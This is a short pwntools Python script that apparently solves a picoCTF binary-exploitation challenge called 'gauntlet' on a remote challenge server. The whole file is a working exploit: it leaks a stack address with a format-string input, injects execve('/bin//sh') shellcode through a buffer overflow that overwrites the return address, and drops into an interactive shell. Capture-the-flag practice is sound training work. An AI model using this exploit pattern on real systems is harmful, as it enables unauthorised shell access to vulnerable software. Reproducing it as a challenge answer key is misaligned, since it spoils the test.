from pwn import *

context.binary = ('./gauntlet')

p = remote('wily-courier.picoctf.net', 56827)

shellcode = asm(
    """
    xor    rax, rax
    push   rax
    xor    rdx, rdx
    xor    rsi, rsi
    movabs rbx, 0x68732f2f6e69622f
    push   rbx
    push   rsp
    pop    rdi
    mov    al, 0x3b
    syscall
    """
)

p.sendline(b"%6$p")

shellcode_addr = int(p.recvline().strip(), 16) - 0x158
log.info(hex(shellcode_addr))
payload = shellcode.ljust(120, b"a")
payload += p64(shellcode_addr)

p.sendline(payload)

p.interactive()
